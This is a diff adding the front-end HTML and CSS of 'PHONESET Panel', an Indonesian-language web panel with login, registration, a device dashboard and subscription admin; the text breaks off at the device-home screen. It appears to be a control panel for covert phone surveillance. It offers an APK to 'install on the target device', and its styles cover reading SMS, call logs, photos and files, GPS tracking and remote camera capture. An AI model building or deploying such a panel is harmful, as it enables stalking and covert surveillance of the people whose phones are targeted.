@@ -1,0 +1,2720 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>PHONESET Panel</title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+<style>
+  :root {
+    --green: #3daa3d;
+    --green-dark: #2d8a2d;
+    --green-light: #55cc55;
+    --purple-bg: radial-gradient(ellipse at center, #5a0082 0%, #2d0050 50%, #0d001a 100%);
+    --card: #ffffff;
+    --text: #1a1a1a;
+    --text-muted: #666;
+    --danger: #e53e3e;
+    --warning: #dd8800;
+    --info: #0077cc;
+  }
+  * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+    background: var(--purple-bg);
+    min-height: 100vh;
+    display: flex;
+    justify-content: center;
+    align-items: flex-start;
+    padding: 0;
+  }
+  #app {
+    width: 100%;
+    max-width: 420px;
+    min-height: 100vh;
+    position: relative;
+    overflow: hidden;
+  }
+
+  /* === SCREENS === */
+  .screen {
+    display: none;
+    flex-direction: column;
+    min-height: 100vh;
+    padding: 0 0 80px 0;
+    animation: fadeIn 0.25s ease;
+  }
+  .screen.active { display: flex; }
+  @keyframes fadeIn { from { opacity: 0; transform: translateY(8px); } to { opacity: 1; transform: translateY(0); } }
+
+  /* === TOPBAR === */
+  .topbar {
+    background: rgba(0,0,0,0.4);
+    backdrop-filter: blur(10px);
+    padding: 14px 16px;
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    position: sticky;
+    top: 0;
+    z-index: 100;
+    border-bottom: 1px solid rgba(255,255,255,0.1);
+  }
+  .topbar .back-btn {
+    width: 36px; height: 36px;
+    background: rgba(255,255,255,0.15);
+    border: none; border-radius: 50%;
+    color: white; font-size: 1rem;
+    cursor: pointer; display: flex; align-items: center; justify-content: center;
+    flex-shrink: 0;
+  }
+  .topbar .back-btn:active { background: rgba(255,255,255,0.3); }
+  .topbar h2 { color: white; font-size: 1.1rem; font-weight: 700; flex: 1; }
+  .topbar .topbar-action {
+    background: var(--green);
+    border: none; border-radius: 20px;
+    color: white; font-size: 0.75rem; font-weight: 700;
+    padding: 6px 14px; cursor: pointer;
+  }
+
+  /* === CARDS === */
+  .card {
+    background: white;
+    border-radius: 20px;
+    padding: 20px;
+    margin: 16px;
+    box-shadow: 0 8px 32px rgba(0,0,0,0.3);
+  }
+  .card-sm { padding: 14px; margin: 8px 16px; border-radius: 16px; }
+
+  /* === BUTTONS === */
+  .btn {
+    display: flex; align-items: center; justify-content: center; gap: 8px;
+    border: none; border-radius: 25px; cursor: pointer;
+    font-weight: 700; font-size: 1rem; padding: 14px 20px;
+    width: 100%; transition: all 0.15s;
+    text-transform: uppercase; letter-spacing: 0.5px;
+  }
+  .btn-green {
+    background: linear-gradient(145deg, #4dc44d, #2d8a2d);
+    color: white;
+    box-shadow: 0 6px 20px rgba(45,138,45,0.5), inset 0 1px 0 rgba(255,255,255,0.25);
+  }
+  .btn-green:active { transform: translateY(2px); box-shadow: 0 3px 10px rgba(45,138,45,0.4); }
+  .btn-red {
+    background: linear-gradient(145deg, #f05252, #c53030);
+    color: white;
+    box-shadow: 0 6px 20px rgba(197,48,48,0.4), inset 0 1px 0 rgba(255,255,255,0.2);
+  }
+  .btn-red:active { transform: translateY(2px); }
+  .btn-blue {
+    background: linear-gradient(145deg, #3b82f6, #1d4ed8);
+    color: white;
+    box-shadow: 0 6px 20px rgba(29,78,216,0.4), inset 0 1px 0 rgba(255,255,255,0.2);
+  }
+  .btn-outline {
+    background: transparent;
+    border: 2px solid var(--green);
+    color: var(--green);
+    box-shadow: none;
+    padding: 12px 20px;
+  }
+  .btn-sm { padding: 8px 14px; font-size: 0.8rem; border-radius: 20px; width: auto; }
+
+  /* === LOGIN SCREEN === */
+  #screen-login {
+    justify-content: center;
+    align-items: center;
+    padding: 20px;
+    min-height: 100vh;
+  }
+  .login-logo {
+    text-align: center;
+    margin-bottom: 10px;
+  }
+  .login-logo .app-icon {
+    width: 80px; height: 80px;
+    background: linear-gradient(135deg, #4dc44d, #1a6b1a);
+    border-radius: 22px;
+    margin: 0 auto 12px;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 2.5rem;
+    box-shadow: 0 8px 30px rgba(45,138,45,0.5), inset 0 2px 0 rgba(255,255,255,0.3);
+  }
+  .login-logo h1 { color: white; font-size: 1.8rem; font-weight: 900; letter-spacing: 3px; }
+  .login-logo p { color: rgba(255,255,255,0.7); font-size: 0.85rem; margin-top: 4px; }
+  .login-card { width: 100%; max-width: 380px; }
+  .input-group { margin-bottom: 14px; }
+  .input-group label { display: block; font-size: 0.8rem; font-weight: 600; color: var(--text-muted); margin-bottom: 6px; text-transform: uppercase; letter-spacing: 0.5px; }
+  .input-field {
+    width: 100%; padding: 14px 16px;
+    border: 2px solid #e5e5e5; border-radius: 14px;
+    font-size: 1rem; color: var(--text); background: #f9f9f9;
+    outline: none; transition: border-color 0.2s;
+  }
+  .input-field:focus { border-color: var(--green); background: white; }
+  .error-msg { color: var(--danger); font-size: 0.8rem; text-align: center; margin-top: 8px; min-height: 18px; }
+  .divider { text-align: center; color: var(--text-muted); font-size: 0.8rem; margin: 12px 0; }
+  .register-link { text-align: center; color: var(--green); font-size: 0.9rem; cursor: pointer; font-weight: 600; margin-top: 8px; }
+  /* device delete mode */
+  .device-card.selected { border-left-color: #ef4444; background: #fff5f5; }
+  .device-checkbox {
+    width: 22px; height: 22px; border-radius: 6px; border: 2px solid #d1d5db;
+    background: white; display: flex; align-items: center; justify-content: center;
+    flex-shrink: 0; transition: all 0.15s;
+  }
+  .device-card.selected .device-checkbox { background: #ef4444; border-color: #ef4444; color: white; }
+  #delete-mode-bar {
+    position: fixed; bottom: 0; left: 50%; transform: translateX(-50%);
+    width: 100%; max-width: 420px; padding: 14px 16px;
+    background: rgba(10,5,20,0.97); border-top: 2px solid #ef4444;
+    z-index: 500; display: none; align-items: center; gap: 10px;
+  }
+  #delete-mode-bar.visible { display: flex; }
+
+  /* === DASHBOARD === */
+  .dashboard-header {
+    padding: 24px 16px 12px;
+    text-align: center;
+  }
+  .dashboard-header h2 { color: white; font-size: 1.4rem; font-weight: 900; letter-spacing: 2px; }
+  .dashboard-header p { color: rgba(255,255,255,0.6); font-size: 0.85rem; margin-top: 4px; }
+  .device-list { padding: 0 16px; }
+  .device-card {
+    background: white;
+    border-radius: 18px;
+    padding: 16px;
+    margin-bottom: 12px;
+    display: flex; align-items: center; gap: 14px;
+    cursor: pointer;
+    box-shadow: 0 6px 24px rgba(0,0,0,0.25);
+    transition: transform 0.15s;
+    border-left: 5px solid var(--green);
+  }
+  .device-card:active { transform: scale(0.98); }
+  .device-card.offline { border-left-color: #aaa; }
+  .device-icon {
+    width: 52px; height: 52px;
+    background: linear-gradient(135deg, #4dc44d, #1a6b1a);
+    border-radius: 14px;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 1.6rem; flex-shrink: 0;
+    box-shadow: 0 4px 12px rgba(45,138,45,0.4);
+  }
+  .device-card.offline .device-icon { background: linear-gradient(135deg, #aaa, #777); box-shadow: none; }
+  .device-info { flex: 1; }
+  .device-info h3 { font-size: 1rem; font-weight: 700; color: var(--text); }
+  .device-info p { font-size: 0.78rem; color: var(--text-muted); margin-top: 2px; }
+  .status-dot { width: 10px; height: 10px; border-radius: 50%; flex-shrink: 0; }
+  .status-dot.online { background: var(--green); box-shadow: 0 0 8px var(--green); }
+  .status-dot.offline { background: #bbb; }
+  .no-devices { text-align: center; padding: 40px 20px; color: rgba(255,255,255,0.5); }
+  .no-devices i { font-size: 3rem; margin-bottom: 12px; }
+  .no-devices p { font-size: 0.9rem; }
+
+  /* === DEVICE HOME (FEATURE GRID) === */
+  .device-info-bar {
+    background: rgba(0,0,0,0.35);
+    backdrop-filter: blur(10px);
+    padding: 14px 16px;
+    display: flex; align-items: center; justify-content: space-between;
+    border-bottom: 1px solid rgba(255,255,255,0.1);
+  }
+  .device-info-bar .d-name { color: white; font-size: 0.95rem; font-weight: 700; }
+  .device-info-bar .d-status { font-size: 0.75rem; display: flex; align-items: center; gap: 5px; }
+  .device-info-bar .d-status.online { color: #66ee66; }
+  .device-info-bar .d-status.offline { color: #aaa; }
+
+  .feature-grid {
+    display: grid;
+    grid-template-columns: repeat(3, 1fr);
+    gap: 12px;
+    padding: 16px;
+  }
+  .feature-btn {
+    background: linear-gradient(145deg, #ffffff, #f0f0f0);
+    border: none; border-radius: 18px;
+    padding: 18px 8px 14px;
+    cursor: pointer;
+    display: flex; flex-direction: column;
+    align-items: center; gap: 8px;
+    box-shadow: 5px 5px 15px rgba(0,0,0,0.35), -2px -2px 8px rgba(255,255,255,0.1), inset 0 1px 0 rgba(255,255,255,0.8);
+    transition: all 0.15s;
+  }
+  .feature-btn:active { transform: translateY(2px) scale(0.97); box-shadow: 2px 2px 8px rgba(0,0,0,0.3); }
+  .feature-btn .f-icon {
+    width: 56px; height: 56px;
+    border-radius: 16px;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 1.6rem;
+    box-shadow: 3px 3px 10px rgba(0,0,0,0.3), inset 0 1px 0 rgba(255,255,255,0.4);
+  }
+  .feature-btn .f-label { font-size: 0.72rem; font-weight: 700; color: #333; text-transform: uppercase; letter-spacing: 0.3px; text-align: center; }
+
+  /* Icon color themes */
+  .ic-green { background: linear-gradient(135deg, #66dd66, #2d8a2d); }
+  .ic-blue { background: linear-gradient(135deg, #60a5fa, #1d4ed8); }
+  .ic-purple { background: linear-gradient(135deg, #a78bfa, #6d28d9); }
+  .ic-orange { background: linear-gradient(135deg, #fb923c, #c2410c); }
+  .ic-teal { background: linear-gradient(135deg, #34d399, #059669); }
+  .ic-red { background: linear-gradient(135deg, #f87171, #dc2626); }
+  .ic-yellow { background: linear-gradient(135deg, #fbbf24, #d97706); }
+  .ic-pink { background: linear-gradient(135deg, #f472b6, #be185d); }
+  .ic-indigo { background: linear-gradient(135deg, #818cf8, #4338ca); }
+  .ic-cyan { background: linear-gradient(135deg, #22d3ee, #0e7490); }
+  .ic-lime { background: linear-gradient(135deg, #a3e635, #65a30d); }
+
+  /* BACKUP button special */
+  .backup-btn-wrap { padding: 0 16px 16px; }
+  .backup-btn {
+    background: linear-gradient(145deg, #ff6b35, #cc3300);
+    color: white; border: none; border-radius: 18px;
+    width: 100%; padding: 18px;
+    font-size: 1.1rem; font-weight: 900; letter-spacing: 2px; text-transform: uppercase;
+    cursor: pointer;
+    display: flex; align-items: center; justify-content: center; gap: 10px;
+    box-shadow: 0 8px 24px rgba(204,51,0,0.5), inset 0 2px 0 rgba(255,255,255,0.2);
+    transition: all 0.15s;
+  }
+  .backup-btn:active { transform: translateY(2px); box-shadow: 0 4px 12px rgba(204,51,0,0.4); }
+  .backup-btn i { font-size: 1.3rem; }
+  .subscription-box {
+    margin: 10px 16px 4px;
+    padding: 14px;
+    background: rgba(255,255,255,0.08);
+    border: 1px solid rgba(255,255,255,0.14);
+    border-radius: 14px;
+    color: white;
+  }
+  .subscription-box .sub-title { font-size: 0.8rem; color: rgba(255,255,255,0.65); margin-bottom: 4px; }
+  .subscription-box .sub-status { font-size: 0.95rem; font-weight: 700; }
+  .plan-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; margin: 12px 0; }
+  .btn-nominal {
+    border: 2px solid #e5e7eb; background: #f9fafb; color: #111827;
+    border-radius: 12px; padding: 10px 6px; font-size: 0.78rem; font-weight: 700; cursor: pointer;
+  }
+  .btn-nominal.active { border-color: var(--green); background: #e8f8e8; color: var(--green-dark); }
+  #qr-container { display: none; margin-top: 14px; }
+  #capture-area { background: white; border-radius: 14px; padding: 14px; text-align: center; }
+  #qrcode { display: flex; justify-content: center; margin-bottom: 10px; }
+  #total-display { font-size: 1.1rem; font-weight: 800; color: #111827; }
+  .payment-instructions { background: #fff7ed; border: 1px solid #fed7aa; border-radius: 12px; padding: 12px; margin-top: 12px; font-size: 0.78rem; color: #7c2d12; }
+  .payment-instructions h4 { margin-bottom: 6px; }
+  .payment-instructions ol { padding-left: 18px; line-height: 1.5; }
+
+  /* === LIST ITEMS === */
+  .list-item {
+    display: flex; align-items: center; gap: 12px;
+    padding: 14px 16px;
+    border-bottom: 1px solid #f0f0f0;
+    cursor: pointer;
+    transition: background 0.1s;
+  }
+  .list-item:last-child { border-bottom: none; }
+  .list-item:active { background: #f5f5f5; }
+  .list-avatar {
+    width: 44px; height: 44px; border-radius: 50%;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 1.2rem; flex-shrink: 0;
+    color: white; font-weight: 700;
+  }
+  .list-item-info { flex: 1; min-width: 0; }
+  .list-item-info .name { font-weight: 600; font-size: 0.95rem; color: var(--text); white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+  .list-item-info .sub { font-size: 0.78rem; color: var(--text-muted); margin-top: 2px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+  .list-actions { display: flex; gap: 6px; flex-shrink: 0; }
+  .icon-action {
+    width: 34px; height: 34px; border-radius: 50%;
+    border: none; cursor: pointer;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 0.9rem; transition: all 0.15s;
+  }
+  .ia-green { background: #e6f9e6; color: var(--green); }
+  .ia-red { background: #fee; color: var(--danger); }
+  .ia-blue { background: #e6f0ff; color: var(--info); }
+  .ia-yellow { background: #fff8e6; color: var(--warning); }
+
+  /* === SEARCH === */
+  .search-bar {
+    padding: 10px 16px;
+    position: sticky; top: 56px; z-index: 90;
+    background: rgba(30,0,50,0.9); backdrop-filter: blur(10px);
+  }
+  .search-bar input {
+    width: 100%; padding: 10px 14px 10px 40px;
+    border: 2px solid rgba(255,255,255,0.2); border-radius: 25px;
+    background: rgba(255,255,255,0.1); color: white;
+    font-size: 0.9rem; outline: none;
+  }
+  .search-bar input::placeholder { color: rgba(255,255,255,0.4); }
+  .search-bar { position: relative; }
+  .search-wrap { position: relative; }
+  .search-icon { position: absolute; left: 12px; top: 50%; transform: translateY(-50%); color: rgba(255,255,255,0.4); font-size: 0.9rem; }
+
+  /* === GALLERY GRID === */
+  .gallery-grid {
+    display: grid;
+    grid-template-columns: repeat(3, 1fr);
+    gap: 2px;
+    padding: 0 16px 16px;
+  }
+  .gallery-item {
+    aspect-ratio: 1;
+    background: #e0e0e0;
+    border-radius: 10px;
+    overflow: hidden;
+    cursor: pointer;
+    position: relative;
+  }
+  .gallery-item img, .gallery-item video { width: 100%; height: 100%; object-fit: cover; }
+  .gallery-item .media-type { position: absolute; top: 5px; right: 5px; background: rgba(0,0,0,0.6); color: white; border-radius: 10px; padding: 2px 6px; font-size: 0.65rem; font-weight: 700; }
+  .gallery-actions { display: flex; gap: 8px; position: absolute; bottom: 5px; left: 5px; right: 5px; }
+  .gallery-item:hover .gallery-actions { display: flex; }
+
+  /* === FILE MANAGER === */
+  .breadcrumb {
+    padding: 8px 16px;
+    display: flex; align-items: center; gap: 6px;
+    background: rgba(0,0,0,0.3);
+    overflow-x: auto;
+    white-space: nowrap;
+  }
+  .breadcrumb span { color: rgba(255,255,255,0.6); font-size: 0.8rem; }
+  .breadcrumb .sep { color: rgba(255,255,255,0.3); }
+  .file-item {
+    display: flex; align-items: center; gap: 12px;
+    padding: 12px 16px;
+    background: white;
+    border-bottom: 1px solid #f5f5f5;
+    cursor: pointer;
+  }
+  .file-item:active { background: #f9f9f9; }
+  .file-icon { font-size: 1.5rem; width: 36px; text-align: center; flex-shrink: 0; }
+  .file-info { flex: 1; min-width: 0; }
+  .file-info .fname { font-size: 0.9rem; font-weight: 600; color: var(--text); white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+  .file-info .fsize { font-size: 0.75rem; color: var(--text-muted); }
+
+  /* === GPS === */
+  .gps-map {
+    height: 220px;
+    background: #c8d8e8;
+    border-radius: 16px;
+    margin: 16px;
+    overflow: hidden;
+    position: relative;
+    display: flex; align-items: center; justify-content: center;
+  }
+  .gps-map iframe { width: 100%; height: 100%; border: none; }
+  .gps-data { padding: 0 16px; }
+  .gps-row {
+    background: white; border-radius: 12px; padding: 14px 16px;
+    margin-bottom: 10px;
+    display: flex; justify-content: space-between; align-items: center;
+    box-shadow: 0 3px 10px rgba(0,0,0,0.15);
+  }
+  .gps-row .gr-label { font-size: 0.8rem; color: var(--text-muted); font-weight: 600; }
+  .gps-row .gr-val { font-size: 0.95rem; font-weight: 700; color: var(--text); }
+
+  /* === CONTROL CARDS === */
+  .control-grid { padding: 0 16px; display: grid; gap: 12px; }
+  .control-card {
+    background: white; border-radius: 18px; padding: 18px;
+    box-shadow: 0 4px 16px rgba(0,0,0,0.2);
+    display: flex; align-items: center; gap: 14px;
+  }
+  .control-icon {
+    width: 52px; height: 52px; border-radius: 14px;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 1.5rem; flex-shrink: 0;
+    box-shadow: 3px 3px 10px rgba(0,0,0,0.25);
+  }
+  .control-info { flex: 1; }
+  .control-info h4 { font-size: 0.95rem; font-weight: 700; color: var(--text); }
+  .control-info p { font-size: 0.78rem; color: var(--text-muted); margin-top: 2px; }
+  .control-btns { display: flex; gap: 6px; }
+  .ctrl-btn {
+    border: none; border-radius: 20px; cursor: pointer;
+    font-size: 0.75rem; font-weight: 700; padding: 7px 12px;
+    transition: all 0.15s; text-transform: uppercase;
+  }
+  .ctrl-btn:active { transform: scale(0.95); }
+
+  /* === SMS DETAIL === */
+  .chat-container { flex: 1; padding: 12px 16px; overflow-y: auto; }
+  .chat-bubble {
+    max-width: 80%; padding: 10px 14px; border-radius: 18px;
+    margin-bottom: 8px; font-size: 0.9rem; line-height: 1.4;
+    position: relative;
+  }
+  .bubble-in { background: white; color: var(--text); border-bottom-left-radius: 5px; margin-right: auto; box-shadow: 0 2px 8px rgba(0,0,0,0.15); }
+  .bubble-out { background: linear-gradient(135deg, #4dc44d, #2d8a2d); color: white; border-bottom-right-radius: 5px; margin-left: auto; }
+  .bubble-time { font-size: 0.68rem; opacity: 0.6; margin-top: 4px; text-align: right; }
+  .chat-input-bar {
+    padding: 10px 12px;
+    background: rgba(0,0,0,0.4);
+    backdrop-filter: blur(10px);
+    display: flex; gap: 8px; align-items: center;
+    position: sticky; bottom: 0;
+  }
+  .chat-input {
+    flex: 1; padding: 12px 16px;
+    border: 2px solid rgba(255,255,255,0.2); border-radius: 25px;
+    background: rgba(255,255,255,0.1); color: white; font-size: 0.9rem; outline: none;
+  }
+  .chat-input::placeholder { color: rgba(255,255,255,0.4); }
+  .chat-send { width: 44px; height: 44px; border-radius: 50%; border: none; background: var(--green); color: white; font-size: 1rem; cursor: pointer; display: flex; align-items: center; justify-content: center; box-shadow: 0 4px 12px rgba(45,138,45,0.5); }
+
+  /* === CAMERA === */
+  .camera-preview {
+    margin: 16px;
+    background: #000;
+    border-radius: 18px;
+    aspect-ratio: 4/3;
+    overflow: hidden;
+    position: relative;
+    box-shadow: 0 8px 24px rgba(0,0,0,0.5);
+    display: flex; align-items: center; justify-content: center;
+    color: rgba(255,255,255,0.3); font-size: 0.9rem; text-align: center;
+  }
+  .camera-preview img { width: 100%; height: 100%; object-fit: cover; }
+  .camera-controls { padding: 0 16px; }
+  .camera-btn-row { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 12px; }
+
+  /* === CALL LOG === */
+  .call-type-in { color: var(--green); }
+  .call-type-out { color: var(--info); }
+  .call-type-miss { color: var(--danger); }
+
+  /* === REGISTER === */
+  #screen-register {
+    justify-content: center;
+    align-items: center;
+    padding: 20px;
+    min-height: 100vh;
+  }
+
+  /* === MODAL === */
+  .modal-overlay {
+    position: fixed; inset: 0;
+    background: rgba(0,0,0,0.7); backdrop-filter: blur(5px);
+    z-index: 999;
+    display: none; align-items: flex-end; justify-content: center;
+  }
+  .modal-overlay.open { display: flex; animation: slideUp 0.25s ease; }
+  @keyframes slideUp { from { transform: translateY(20px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
+  .modal-sheet {
+    background: white; border-radius: 24px 24px 0 0;
+    width: 100%; max-width: 420px;
+    padding: 20px;
+    max-height: 85vh; overflow-y: auto;
+  }
+  .modal-handle { width: 40px; height: 4px; background: #e0e0e0; border-radius: 2px; margin: 0 auto 16px; }
+  .modal-title { font-size: 1.1rem; font-weight: 800; color: var(--text); margin-bottom: 16px; }
+
+  /* === TOAST === */
+  #toast {
+    position: fixed; bottom: 30px; left: 50%; transform: translateX(-50%);
+    background: rgba(0,0,0,0.85); color: white;
+    padding: 10px 20px; border-radius: 25px; font-size: 0.85rem;
+    z-index: 9999; display: none;
+    white-space: nowrap;
+    box-shadow: 0 4px 20px rgba(0,0,0,0.4);
+  }
+
+  /* === LOADER === */
+  .loader { display: flex; align-items: center; justify-content: center; padding: 40px; }
+  .spinner { width: 36px; height: 36px; border: 4px solid rgba(255,255,255,0.2); border-top-color: var(--green); border-radius: 50%; animation: spin 0.8s linear infinite; }
+  @keyframes spin { to { transform: rotate(360deg); } }
+
+  /* === SETTINGS SCREEN === */
+  .settings-item {
+    display: flex; align-items: center; gap: 14px;
+    padding: 16px;
+    border-bottom: 1px solid #f5f5f5;
+  }
+  .settings-item:last-child { border-bottom: none; }
+  .settings-icon { width: 40px; height: 40px; border-radius: 12px; display: flex; align-items: center; justify-content: center; font-size: 1.1rem; flex-shrink: 0; box-shadow: 2px 2px 8px rgba(0,0,0,0.2); }
+  .settings-label { flex: 1; font-size: 0.9rem; font-weight: 600; color: var(--text); }
+  .toggle {
+    width: 46px; height: 26px; background: #ddd; border-radius: 13px;
+    position: relative; cursor: pointer; transition: background 0.2s; flex-shrink: 0;
+    border: none;
+  }
+  .toggle.on { background: var(--green); }
+  .toggle::after {
+    content: ''; position: absolute; width: 20px; height: 20px;
+    background: white; border-radius: 50%; top: 3px; left: 3px;
+    transition: left 0.2s; box-shadow: 0 2px 5px rgba(0,0,0,0.25);
+  }
+  .toggle.on::after { left: 23px; }
+
+  /* === SECTION HEADER === */
+  .section-header {
+    padding: 16px 16px 8px;
+    color: rgba(255,255,255,0.5);
+    font-size: 0.75rem;
+    font-weight: 700;
+    text-transform: uppercase;
+    letter-spacing: 1px;
+  }
+
+  /* logout */
+  .logout-btn {
+    margin: 8px 16px;
+    background: transparent;
+    border: 2px solid rgba(255,255,255,0.2);
+    color: rgba(255,255,255,0.6);
+    border-radius: 25px;
+    padding: 12px;
+    font-size: 0.9rem;
+    cursor: pointer;
+    display: flex; align-items: center; justify-content: center; gap: 8px;
+    font-weight: 600;
+  }
+  .logout-btn:active { background: rgba(255,255,255,0.1); }
+
+  /* empty state */
+  .empty-state { text-align: center; padding: 50px 20px; color: rgba(255,255,255,0.4); }
+  .empty-state i { font-size: 3rem; margin-bottom: 12px; display: block; }
+  .empty-state p { font-size: 0.9rem; }
+
+  html, body { margin: 0; padding: 0; }
+</style>
+</head>
+<body>
+<div id="app">
+
+  <!-- ========== LOGIN SCREEN ========== -->
+  <div id="screen-login" class="screen active">
+    <div class="login-logo">
+      <div class="app-icon">📱</div>
+      <h1>PHONESET</h1>
+      <p>Selamat Datang</p>
+    </div>
+    <div class="card login-card" style="margin-top:20px">
+      <div class="input-group">
+        <label>Email</label>
+        <input type="email" id="login-email" class="input-field" placeholder="nama@email.com" autocomplete="email">
+      </div>
+      <div class="input-group">
+        <label>Password</label>
+        <input type="password" id="login-pin" class="input-field" placeholder="Masukkan password">
+      </div>
+      <div id="login-error" class="error-msg"></div>
+      <button class="btn btn-green" id="btn-masuk" style="margin-top:8px">
+        <i class="fa-solid fa-right-to-bracket"></i> MASUK
+      </button>
+      <div style="text-align:center;margin-top:14px;color:#aaa;font-size:0.85rem">
+        Belum punya akun? <span class="register-link" style="display:inline;margin:0" onclick="showScreen('screen-register')">Daftar</span>
+      </div>
+    </div>
+    <div class="card" style="margin:12px 16px;background:linear-gradient(135deg,#1e0a35,#0d0020);border:1px solid #22c55e44;border-radius:18px;padding:16px">
+      <div style="display:flex;align-items:center;gap:12px;margin-bottom:12px">
+        <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj_YdBAxqQmoiQDWXfc8Y46QgkY5gmdp8a0HEv_X8o2XFT8EJ1zt2a4gSzRyd2HJLVULMPIa5H0T9SwOE-1EM2YYftqVu1Fko7VBJyO6t4aLCmKGPaBWwUsNmslYONhJ2yXUqlgayngNr3rOtNRdb_thHm08WjcQGLIvyAPQGoykXKbdQrbLfxJ5xXMdGc/s1024/90646.png" style="width:52px;height:52px;border-radius:14px;box-shadow:0 4px 14px rgba(34,197,94,0.4)" alt="PhoneSet Icon">
+        <div style="flex:1">
+          <div style="color:white;font-weight:700;font-size:0.95rem">Install APK di Perangkat Target</div>
+          <div style="color:#9ca3af;font-size:0.8rem;margin-top:2px">APK siap install</div>
+        </div>
+      </div>
+      <a href="/panel/phoneset.apk" download="phoneset.apk"
+         style="display:flex;align-items:center;justify-content:center;gap:8px;margin-bottom:8px;background:linear-gradient(145deg,#22c55e,#16a34a);color:white;border-radius:12px;padding:13px;text-decoration:none;font-weight:700;font-size:0.95rem;box-shadow:0 4px 14px rgba(34,197,94,0.35)">
+        <i class="fa-solid fa-android"></i> Download APK (Siap Install)
+      </a>
+      <div style="display:flex;gap:8px;margin-top:8px">
+        <a href="/p/privacy_policy.html" target="_blank"
+           style="flex:1;display:flex;align-items:center;justify-content:center;gap:5px;background:rgba(255,255,255,0.05);color:#6b7280;border-radius:10px;padding:8px;text-decoration:none;font-size:0.75rem;border:1px solid rgba(255,255,255,0.08)">
+          <i class="fa-solid fa-shield"></i> Privacy Policy
+        </a>
+        <a href="/p/terms_of_service.html" target="_blank"
+           style="flex:1;display:flex;align-items:center;justify-content:center;gap:5px;background:rgba(255,255,255,0.05);color:#6b7280;border-radius:10px;padding:8px;text-decoration:none;font-size:0.75rem;border:1px solid rgba(255,255,255,0.08)">
+          <i class="fa-solid fa-file-contract"></i> Terms of Service
+        </a>
+      </div>
+    </div>
+  </div>
+
+  <!-- ========== REGISTER SCREEN ========== -->
+  <div id="screen-register" class="screen">
+    <div class="login-logo" style="padding-top:30px">
+      <div class="app-icon">📱</div>
+      <h1>PHONESET</h1>
+      <p>Buat Akun Baru</p>
+    </div>
+    <div class="card login-card" style="margin-top:20px;margin-left:16px;margin-right:16px">
+      <div class="input-group">
+        <label>Nama</label>
+        <input type="text" id="reg-name" class="input-field" placeholder="Nama Anda">
+      </div>
+      <div class="input-group">
+        <label>Email</label>
+        <input type="email" id="reg-email" class="input-field" placeholder="nama@email.com">
+      </div>
+      <div class="input-group">
+        <label>Password</label>
+        <input type="password" id="reg-pin" class="input-field" placeholder="Min. 6 karakter">
+      </div>
+      <div class="input-group">
+        <label>Konfirmasi Password</label>
+        <input type="password" id="reg-pin2" class="input-field" placeholder="Ulangi password">
+      </div>
+      <div id="reg-error" class="error-msg"></div>
+      <button class="btn btn-green" id="btn-daftar" style="margin-top:8px">
+        <i class="fa-solid fa-user-plus"></i> DAFTAR
+      </button>
+      <div style="text-align:center;margin-top:14px;color:#aaa;font-size:0.85rem">
+        Sudah punya akun? <span class="register-link" style="display:inline;margin:0" onclick="showScreen('screen-login')">Masuk</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- ========== DASHBOARD SCREEN ========== -->
+  <div id="screen-dashboard" class="screen">
+    <div class="topbar">
+      <h2><i class="fa-solid fa-shield-halved" style="color:#66ee66;margin-right:6px"></i> PHONESET</h2>
+      <div style="display:flex;gap:8px">
+        <button class="topbar-action" id="btn-manage-devices" onclick="toggleDeleteMode()"
+          style="background:rgba(255,255,255,0.12);color:#f87171;border:1px solid rgba(248,113,113,0.3)">
+          <i class="fa-solid fa-trash-can"></i>
+        </button>
+        <button class="topbar-action" onclick="logout()"><i class="fa-solid fa-right-from-bracket"></i></button>
+      </div>
+    </div>
+    <div class="dashboard-header">
+      <h2>Perangkat Saya</h2>
+      <p id="dash-user-email">memuat...</p>
+    </div>
+    <div class="section-header" id="device-section-label">Perangkat Aktif</div>
+    <div class="device-list" id="device-list">
+      <div class="loader"><div class="spinner"></div></div>
+    </div>
+    <!-- Delete mode bottom bar -->
+    <div id="delete-mode-bar">
+      <i class="fa-solid fa-circle-check" style="color:#ef4444"></i>
+      <span id="delete-count" style="flex:1;color:white;font-size:0.9rem;font-weight:600">0 dipilih</span>
+      <button onclick="deleteSelectedDevices()"
+        style="background:#ef4444;color:white;border:none;border-radius:20px;padding:10px 22px;font-weight:700;font-size:0.85rem;cursor:pointer">
+        <i class="fa-solid fa-trash"></i> Hapus
+      </button>
+      <button onclick="toggleDeleteMode()"
+        style="background:rgba(255,255,255,0.12);color:white;border:none;border-radius:20px;padding:10px 16px;font-weight:700;font-size:0.85rem;cursor:pointer">
+        Batal
+      </button>
+    </div>
+  </div>
+
+  <!-- ========== ADMIN SUBSCRIPTIONS ========== -->
+  <div id="screen-admin" class="screen">
+    <div class="topbar">
+      <h2><i class="fa-solid fa-shield-halved" style="color:#fbbf24;margin-right:6px"></i> Admin Langganan</h2>
+      <button class="topbar-action" onclick="logout()">Keluar</button>
+    </div>
+    <div class="card-sm" style="background:rgba(255,255,255,0.1);color:white">
+      <div style="font-size:0.8rem;color:rgba(255,255,255,0.7)">Login admin</div>
+      <div id="admin-email" style="font-weight:700;margin-top:2px">-</div>
+    </div>
+    <div class="section-header">Permintaan Pembelian Paket</div>
+    <div id="admin-subscription-list" style="margin:0 16px 16px">
+      <div class="loader"><div class="spinner"></div></div>
+    </div>
+  </div>
+
+  <!-- ========== DEVICE HOME ========== -->
+  <div id="screen-device-home" class="screen">
+    <div class="topbar">
